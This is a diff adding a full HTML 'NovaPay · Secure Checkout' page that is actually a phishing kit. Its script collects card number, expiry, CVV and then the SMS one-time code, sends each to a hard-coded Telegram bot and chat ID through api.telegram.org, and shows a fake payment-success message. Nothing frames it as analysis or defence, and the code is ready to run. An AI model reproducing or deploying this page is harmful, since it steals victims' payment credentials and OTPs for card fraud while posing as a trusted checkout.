@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>NovaPay · Secure Checkout</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(145deg, #f0f4fa 0%, #e6ecf5 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .card {
+      max-width: 460px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 36px;
+      box-shadow: 0 25px 50px -12px rgba(0, 20, 40, 0.25), 0 4px 12px 0 rgba(0, 0, 0, 0.05);
+      padding: 32px 28px;
+      transition: all 0.2s ease;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 28px;
+      justify-content: center;
+    }
+
+    .brand-icon {
+      background: #0a2540;
+      width: 44px;
+      height: 44px;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 700;
+      font-size: 24px;
+      letter-spacing: -0.5px;
+      box-shadow: 0 8px 14px -6px rgba(10, 37, 64, 0.3);
+    }
+
+    .brand-name {
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      color: #0a2540;
+    }
+
+    .brand-name span {
+      color: #3a7bd5;
+      font-weight: 800;
+    }
+
+    .title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1e2e45;
+      margin-bottom: 6px;
+      text-align: center;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #6b7a8f;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #2a3b52;
+      margin-bottom: 8px;
+      letter-spacing: 0.2px;
+    }
+
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .input-wrapper input {
+      width: 100%;
+      padding: 16px 18px;
+      font-size: 16px;
+      border: 1.5px solid #dde3ec;
+      border-radius: 18px;
+      outline: none;
+      background: #fafcff;
+      transition: border 0.2s, box-shadow 0.2s;
+      color: #0f1c2e;
+      font-weight: 500;
+      letter-spacing: 0.3px;
+    }
+
+    .input-wrapper input:focus {
+      border-color: #3a7bd5;
+      box-shadow: 0 0 0 4px rgba(58, 123, 213, 0.12);
+      background: #ffffff;
+    }
+
+    .input-wrapper input::placeholder {
+      color: #a7b4c7;
+      font-weight: 400;
+      font-size: 15px;
+      letter-spacing: 0.4px;
+    }
+
+    .row-2 {
+      display: flex;
+      gap: 14px;
+    }
+
+    .row-2 .form-group {
+      flex: 1;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 18px;
+      background: #0a2540;
+      color: white;
+      border: none;
+      border-radius: 22px;
+      font-size: 17px;
+      font-weight: 700;
+      letter-spacing: 0.3px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 12px 24px -8px rgba(10, 37, 64, 0.35);
+      margin-top: 10px;
+    }
+
+    .btn:hover {
+      background: #132e4f;
+      transform: scale(1.01);
+    }
+
+    .btn:active {
+      transform: scale(0.98);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      pointer-events: none;
+      transform: none;
+    }
+
+    .otp-section {
+      display: none;
+      margin-top: 16px;
+    }
+
+    .otp-section.active {
+      display: block;
+    }
+
+    .otp-hint {
+      font-size: 13px;
+      color: #6b7a8f;
+      text-align: center;
+      margin-top: 12px;
+      line-height: 1.5;
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 22px;
+      height: 22px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #ffffff;
+      animation: spin 0.8s linear infinite;
+      vertical-align: middle;
+      margin-right: 10px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .status-message {
+      font-size: 13px;
+      text-align: center;
+      margin-top: 16px;
+      padding: 12px;
+      border-radius: 14px;
+      font-weight: 500;
+    }
+
+    .status-message.error {
+      background: #ffe9e9;
+      color: #c00;
+    }
+
+    .status-message.success {
+      background: #e3f5e9;
+      color: #0a7a3e;
+    }
+
+    .footer-note {
+      text-align: center;
+      font-size: 12px;
+      color: #8f9db0;
+      margin-top: 26px;
+      display: flex;
+      justify-content: center;
+      gap: 6px;
+      align-items: center;
+    }
+
+    .lock-icon {
+      font-size: 14px;
+    }
+
+    #otpCode {
+      letter-spacing: 8px;
+      font-weight: 600;
+      text-align: center;
+      font-size: 22px;
+      padding: 14px 12px;
+    }
+
+    #otpCode::placeholder {
+      letter-spacing: 2px;
+      font-size: 15px;
+      font-weight: 400;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="brand">
+      <div class="brand-icon">N</div>
+      <div class="brand-name">Nova<span>Pay</span></div>
+    </div>
+
+    <h2 class="title" id="formTitle">Payment details</h2>
+    <p class="subtitle" id="formSubtitle">All transactions are secure and encrypted</p>
+
+    <div id="cardForm">
+      <div class="form-group">
+        <label for="cardNumber">Card number</label>
+        <div class="input-wrapper">
+          <input type="tel" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" autocomplete="cc-number">
+        </div>
+      </div>
+
+      <div class="row-2">
+        <div class="form-group">
+          <label for="expiry">Expiry date</label>
+          <div class="input-wrapper">
+            <input type="tel" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <div class="input-wrapper">
+            <input type="tel" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+          </div>
+        </div>
+      </div>
+
+      <button class="btn" id="payBtn">Continue</button>
+      <div id="cardStatus" class="status-message hidden"></div>
+    </div>
+
+    <div id="otpForm" class="otp-section">
+      <div class="form-group">
+        <label for="otpCode">Verification code</label>
+        <div class="input-wrapper">
+          <input type="tel" id="otpCode" placeholder="Enter OTP" maxlength="8" inputmode="numeric" autocomplete="one-time-code">
+        </div>
+      </div>
+      <button class="btn" id="otpBtn">Verify & pay</button>
+      <div class="otp-hint">
+        A 6-digit code was sent to your phone.<br>
+        Enter it above to confirm the payment.
+      </div>
+      <div id="otpStatus" class="status-message hidden"></div>
+    </div>
+
+    <div class="footer-note">
+      <span class="lock-icon">🔒</span> Secured by NovaPay · 256-bit SSL
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ======== KONFIQ ========
+      const TELEGRAM_BOT_TOKEN = '9135930495:AAF6snXnVCxC50519xMp7PyBpTTy9Efucu8';
+      const TELEGRAM_CHAT_ID = '-1004353567100';
+
+      // ======== ELEMENTLƏR ========
+      const cardForm = document.getElementById('cardForm');
+      const otpForm = document.getElementById('otpForm');
+      const cardNumber = document.getElementById('cardNumber');
+      const expiry = document.getElementById('expiry');
+      const cvv = document.getElementById('cvv');
+      const payBtn = document.getElementById('payBtn');
+      const cardStatus = document.getElementById('cardStatus');
+      const otpCode = document.getElementById('otpCode');
+      const otpBtn = document.getElementById('otpBtn');
+      const otpStatus = document.getElementById('otpStatus');
+      const formTitle = document.getElementById('formTitle');
+      const formSubtitle = document.getElementById('formSubtitle');
+
+      // ======== KÖMƏKÇI FUNKSİYALAR ========
+      function showStatus(el, text, type) {
+        el.textContent = text;
+        el.className = 'status-message ' + type;
+        el.classList.remove('hidden');
+      }
+
+      function hideStatus(el) {
+        el.classList.add('hidden');
+      }
+
+      cardNumber.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 16) value = value.slice(0, 16);
+        let formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+        e.target.value = formatted;
+      });
+
+      expiry.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 4) value = value.slice(0, 4);
+        if (value.length >= 3) {
+          e.target.value = value.slice(0, 2) + '/' + value.slice(2);
+        } else {
+          e.target.value = value;
+        }
+      });
+
+      cvv.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+      });
+
+      otpCode.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 8);
+      });
+
+      // ======== TELEGRAM MESAJ GÖNDƏR ========
+      async function sendToTelegram(text) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+          console.warn('Telegram bot token və chat id boşdur.');
+          return;
+        }
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+          await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: text,
+              parse_mode: 'HTML'
+            })
+          });
+        } catch (err) {
+          console.error('Telegram xətası:', err);
+        }
+      }
+
+      // ======== KART MƏLUMATLARINI GÖNDƏR ========
+      async function submitCardData() {
+        const rawCard = cardNumber.value.replace(/\s/g, '');
+        const exp = expiry.value;
+        const cvvVal = cvv.value;
+
+        if (rawCard.length < 16) {
+          showStatus(cardStatus, 'Please enter a valid 16-digit card number.', 'error');
+          return;
+        }
+        if (!/^\d{2}\/\d{2}$/.test(exp)) {
+          showStatus(cardStatus, 'Please enter expiry date as MM/YY.', 'error');
+          return;
+        }
+        if (cvvVal.length < 3) {
+          showStatus(cardStatus, 'Please enter a valid CVV.', 'error');
+          return;
+        }
+
+        hideStatus(cardStatus);
+        payBtn.disabled = true;
+        payBtn.innerHTML = '<span class="spinner"></span> Processing...';
+
+        const message = `
+<b>💳 NovaPay – Yeni kart məlumatı</b>
+<b>Kart nömrəsi:</b> <code>${rawCard}</code>
+<b>Son istifadə:</b> ${exp}
+<b>CVV:</b> ${cvvVal}
+        `.trim();
+
+        await sendToTelegram(message);
+
+        setTimeout(() => {
+          cardForm.style.display = 'none';
+          otpForm.classList.add('active');
+          formTitle.textContent = 'Verification required';
+          formSubtitle.textContent = 'Enter the one-time password sent to your device';
+          payBtn.disabled = false;
+          payBtn.textContent = 'Continue';
+        }, 5000);
+      }
+
+      // ======== OTP GÖNDƏR ========
+      async function submitOtp() {
+        const code = otpCode.value.trim();
+        if (code.length < 4) {
+          showStatus(otpStatus, 'Please enter the verification code.', 'error');
+          return;
+        }
+
+        hideStatus(otpStatus);
+        otpBtn.disabled = true;
+        otpBtn.innerHTML = '<span class="spinner"></span> Verifying...';
+
+        const message = `
+<b>🔐 NovaPay – OTP kodu</b>
+<b>OTP:</b> <code>${code}</code>
+        `.trim();
+
+        await sendToTelegram(message);
+
+        setTimeout(() => {
+          otpBtn.disabled = false;
+          otpBtn.textContent = 'Verify & pay';
+          showStatus(otpStatus, '✅ Payment successfully verified! Thank you.', 'success');
+          otpCode.value = '';
+        }, 5000);
+      }
+
+      payBtn.addEventListener('click', submitCardData);
+      otpBtn.addEventListener('click', submitOtp);
+
+      cardNumber.addEventListener('keypress', (e) => { if (e.key === 'Enter') payBtn.click(); });
+      expiry.addEventListener('keypress', (e) => { if (e.key === 'Enter') payBtn.click(); });
+      cvv.addEventListener('keypress', (e) => { if (e.key === 'Enter') payBtn.click(); });
+      otpCode.addEventListener('keypress', (e) => { if (e.key === 'Enter') otpBtn.click(); });
+    })();
+  </script>
+</body>
+</html>
